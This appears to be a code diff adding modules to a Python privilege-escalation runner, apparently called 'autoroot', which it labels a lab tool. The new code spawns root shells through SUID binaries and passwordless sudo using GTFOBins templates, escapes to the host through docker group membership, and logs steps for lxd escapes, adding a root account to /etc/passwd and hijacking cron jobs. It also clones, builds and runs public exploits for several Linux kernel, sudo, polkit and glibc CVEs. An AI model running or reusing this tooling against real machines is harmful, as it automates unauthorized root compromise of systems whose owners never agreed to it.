@@ -20,6 +20,13 @@ import argparse
 import os
 import platform
 import re
+try:
+    import grp
+    import pwd
+except ImportError:  # non-Linux development host
+    grp = None
+    pwd = None
+import shlex
 import shutil
 import stat
 import subprocess
@@ -230,6 +237,42 @@ def sh(cmd: str, desc: str = "", cwd: str | None = None,
 
 def have(cmd: str) -> bool:
     return shutil.which(cmd) is not None
+
+
+def capture(cmd: str, cwd: str | None = None, timeout: int = 20) -> str:
+    try:
+        return subprocess.run(
+            ["bash", "-c", cmd],
+            cwd=cwd or WORK,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+        ).stdout.strip()
+    except (OSError, subprocess.TimeoutExpired):
+        return ""
+
+
+def user_groups() -> set[str]:
+    names = set()
+    if grp is None or pwd is None:
+        return names
+    try:
+        user = pwd.getpwuid(os.getuid()).pw_name
+    except KeyError:
+        user = os.environ.get("USER", "")
+    for group in grp.getgrall():
+        if user in group.gr_mem:
+            names.add(group.gr_name)
+    for gid in os.getgroups():
+        try:
+            names.add(grp.getgrgid(gid).gr_name)
+        except KeyError:
+            pass
+    return names
+
+
+def writable(path: str) -> bool:
+    return os.access(path, os.W_OK)
 
 
 def root() -> bool:
@@ -536,6 +579,281 @@ def m_64600():
     return True
 
 
+GTFOBINS = {
+    "bash": "{p} -p",
+    "sh": "{p} -p",
+    "dash": "{p} -p",
+    "zsh": "{p} -p",
+    "find": "{p} . -exec /bin/sh -p \\; -quit",
+    "vim": "{p} -c ':!/bin/sh'",
+    "vi": "{p} -c ':!/bin/sh'",
+    "nvim": "{p} -c ':!/bin/sh'",
+    "awk": "{p} 'BEGIN {system(\"/bin/sh\")}'",
+    "gawk": "{p} 'BEGIN {system(\"/bin/sh\")}'",
+    "mawk": "{p} 'BEGIN {system(\"/bin/sh\")}'",
+    "perl": "{p} -e 'exec \"/bin/sh\";'",
+    "python": "{p} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+    "python3": "{p} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+    "tar": "{p} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+    "env": "{p} /bin/sh -p",
+}
+
+
+def find_suid() -> list[str]:
+    out = capture(
+        "find / -xdev -perm -4000 -type f 2>/dev/null | head -200",
+        timeout=35,
+    )
+    return [line.strip() for line in out.splitlines() if line.strip()]
+
+
+@module("suid_gtfobins", "SUID + GTFOBins", "SUID binaries")
+def m_suid():
+    paths = find_suid()
+    if not paths:
+        log(warn("      no SUID binaries found"))
+        return False
+    log(f"      {len(paths)} SUID binaries")
+    for path in paths:
+        name = os.path.basename(path)
+        template = GTFOBINS.get(name)
+        if not template:
+            continue
+        command = template.format(p=shlex.quote(path))
+        log(ok(f"      {path} -> GTFOBins"))
+        sh(command, "run SUID shell")
+        return True
+    log(warn("      no known GTFOBins SUID binary"))
+    return False
+
+
+@module("sudo_nopasswd", "sudo NOPASSWD + GTFOBins", "sudo -n -l")
+def m_sudo():
+    out = capture("sudo -n -l 2>&1", timeout=15)
+    if not out or "NOPASSWD" not in out:
+        log(warn("      no passwordless sudo entry"))
+        return False
+    log(out)
+    for line in out.splitlines():
+        if "NOPASSWD" not in line:
+            continue
+        spec = line.split("NOPASSWD:", 1)[1]
+        for item in spec.split(","):
+            path = item.strip().split()[0] if item.strip() else ""
+            if not path:
+                continue
+            if path == "ALL":
+                sh("sudo -n /bin/bash", "sudo ALL -> shell")
+                return True
+            name = os.path.basename(path)
+            template = GTFOBINS.get(name)
+            if template:
+                command = "sudo -n " + template.format(p=shlex.quote(path))
+                log(ok(f"      {path} -> GTFOBins"))
+                sh(command, "run sudo shell")
+                return True
+    log(warn("      NOPASSWD entries found, but no known GTFOBins"))
+    return False
+
+
+@module("docker_group", "Docker group escape", "docker group")
+def m_docker():
+    if "docker" not in user_groups() or not have("docker"):
+        log(warn("      not in docker group / docker missing"))
+        return False
+    image = capture(
+        "docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null "
+        "| grep -v '<none>' | head -1",
+        timeout=20,
+    )
+    if not image:
+        log(warn("      no local image; pulling alpine"))
+        sh("docker pull alpine", "pull alpine", timeout=120)
+        image = "alpine"
+    command = (
+        f"docker run --rm -it -v /:/mnt --entrypoint /bin/sh "
+        f"{shlex.quote(image)} -c 'chroot /mnt /bin/bash'"
+    )
+    sh(command, "docker host escape")
+    return True
+
+
+@module("lxd_group", "LXD group escape", "lxd group")
+def m_lxd():
+    if "lxd" not in user_groups() or not have("lxc"):
+        log(warn("      not in lxd group / lxc missing"))
+        return False
+    log(warn("      lxd group found; manual sequence:"))
+    log("        lxc init ubuntu:22.04 c -c security.privileged=true")
+    log("        lxc config device add c host disk source=/ path=/mnt")
+    log("        lxc start c")
+    log("        lxc exec c chroot /mnt /bin/sh")
+    return True
+
+
+@module("writable_passwd", "writable /etc/passwd or /etc/shadow", "write check")
+def m_passwd():
+    if writable("/etc/passwd"):
+        log(bad("      /etc/passwd is writable"))
+        log("        cp /etc/passwd /tmp/passwd.bak")
+        log("        openssl passwd -1 -salt x password")
+        log("        echo 'autoroot:$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd")
+        log("        su autoroot")
+        return True
+    if writable("/etc/shadow"):
+        log(bad("      /etc/shadow is writable"))
+        log("        replace root hash with a known one, then su root")
+        return True
+    log(warn("      /etc/passwd and /etc/shadow are not writable"))
+    return False
+
+
+@module("writable_root_jobs", "writable cron/systemd/logrotate", "write check")
+def m_jobs():
+    paths = [
+        "/etc/crontab", "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly",
+        "/etc/cron.weekly", "/etc/cron.monthly", "/var/spool/cron",
+        "/etc/systemd/system", "/etc/logrotate.d", "/etc/logrotate.conf",
+    ]
+    found = []
+    for path in paths:
+        if os.path.exists(path) and writable(path):
+            found.append(path)
+    extra = capture(
+        "find /etc/cron* /etc/systemd/system /etc/logrotate.d "
+        "-writable -type f 2>/dev/null | head -50",
+        timeout=20,
+    )
+    for line in extra.splitlines():
+        if line.strip() and line.strip() not in found:
+            found.append(line.strip())
+    if not found:
+        log(warn("      no writable root job files"))
+        return False
+    log(bad("      writable root job paths:"))
+    for path in found:
+        log(f"        {path}")
+    log("        add a root command to one of these and wait for the job")
+    return True
+
+
+@module("sudo_baron", "sudo Baron Samedit (CVE-2021-3156)", "sudo < 1.9.5p2")
+def m_baron():
+    version = capture("sudo -V 2>/dev/null | head -1")
+    if not version:
+        log(warn("      sudo not found"))
+        return False
+    log(f"      {version}")
+    if not re.search(r"1\.(8\.|9\.[0-5])", version):
+        log(warn("      sudo version not in the vulnerable range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/blasty/CVE-2021-3156.git baron", "clone")
+    d = os.path.join(WORK, "baron")
+    sh("make", "make", cwd=d)
+    sh("ls -la", "list", cwd=d)
+    sh("./sudo-hax-me-a-sandwich", "run", cwd=d)
+    return True
+
+
+@module("polkit_3560", "polkit (CVE-2021-3560)", "polkit/pkexec")
+def m_polkit():
+    if not have("pkexec"):
+        log(warn("      pkexec not found"))
+        return False
+    sh("git clone --depth 1 https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.git polkit", "clone")
+    d = os.path.join(WORK, "polkit")
+    sh("chmod +x exploit.sh 2>/dev/null; bash exploit.sh", "run", cwd=d)
+    return True
+
+
+@module("looney", "Looney Tunables (CVE-2023-4911)", "glibc 2.34-2.38")
+def m_looney():
+    version = capture("ldd --version 2>/dev/null | head -1")
+    log(f"      {version or 'glibc unknown'}")
+    if not have("git") or not ensure_compiler():
+        return False
+    sh("git clone --depth 1 https://github.com/leesh3288/CVE-2023-4911.git looney", "clone")
+    d = os.path.join(WORK, "looney")
+    sh(f"{CC} exp.c -o exp", "compile", cwd=d)
+    sh("./exp", "run", cwd=d)
+    return True
+
+
+@module("nft_1086", "nftables (CVE-2024-1086)", "kernel 5.14-6.6")
+def m_nft():
+    if not in_kernel_range((5, 14), (6, 6)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/Notselwyn/CVE-2024-1086.git nft1086", "clone")
+    d = os.path.join(WORK, "nft1086")
+    sh("make", "make", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2021_22555", "netfilter (CVE-2021-22555)", "kernel 2.6-5.12")
+def m_22555():
+    if not in_kernel_range((2, 6), (5, 12)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/google/security-research.git gsr", "clone")
+    d = os.path.join(WORK, "gsr", "pocs", "linux", "cve-2021-22555")
+    if not os.path.isdir(d):
+        log(warn("      expected path not found"))
+        return False
+    sh("make", "make", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2021_3493", "Ubuntu overlayfs (CVE-2021-3493)", "Ubuntu kernel")
+def m_3493():
+    if distro_id() not in ("ubuntu", "linuxmint"):
+        log(warn("      not Ubuntu"))
+        return False
+    if not have("git") or not ensure_compiler():
+        return False
+    sh("git clone --depth 1 https://github.com/briskets/CVE-2021-3493.git cve3493", "clone")
+    d = os.path.join(WORK, "cve3493")
+    sh(f"{CC} exploit.c -o exploit", "compile", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2022_0185", "fs_context (CVE-2022-0185)", "kernel 5.4-5.16")
+def m_0185():
+    if not in_kernel_range((5, 4), (5, 16)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/Crusaders-of-Rust/CVE-2022-0185.git cve0185", "clone")
+    d = os.path.join(WORK, "cve0185")
+    sh("make", "make", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2022_2588", "cls_route (CVE-2022-2588)", "kernel 5.8-5.19")
+def m_2588():
+    if not in_kernel_range((5, 8), (5, 19)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/Markakd/CVE-2022-2588.git cve2588", "clone")
+    d = os.path.join(WORK, "cve2588")
+    sh("make", "make", cwd=d)
+    sh("./exp", "run", cwd=d)
+    return True
+
+
 @module("untrusted_copyfail", "copy.fail remote script", "UNTRUSTED", untrusted=True)
 def m_copyfail():
     if not UNTRUSTED:
@@ -636,7 +954,14 @@ def main(argv=None) -> int:
     args = p.parse_args(argv)
 
     if args.list:
-        for mod in MODULES:
+        high = {
+            "suid_gtfobins", "sudo_nopasswd", "docker_group", "lxd_group",
+            "writable_passwd", "writable_root_jobs",
+        }
+        ordered = sorted(MODULES, key=lambda m: (
+            0 if m.key == "recon" else 1 if m.key in high else 2
+        ))
+        for mod in ordered:
             flags = []
             if mod.untrusted:
                 flags.append("untrusted")
@@ -670,6 +995,13 @@ def main(argv=None) -> int:
             if (args.labs or not m.lab)
             and (args.allow_untrusted or not m.untrusted)
         ]
+    high = {
+        "suid_gtfobins", "sudo_nopasswd", "docker_group", "lxd_group",
+        "writable_passwd", "writable_root_jobs",
+    }
+    selected.sort(key=lambda m: (
+        0 if m.key == "recon" else 1 if m.key in high else 2
+    ))
 
     log(bold("autoroot - lab privilege-escalation runner"))
     log(f"user   : {os.getuid()} ({os.environ.get('USER', '?')})")
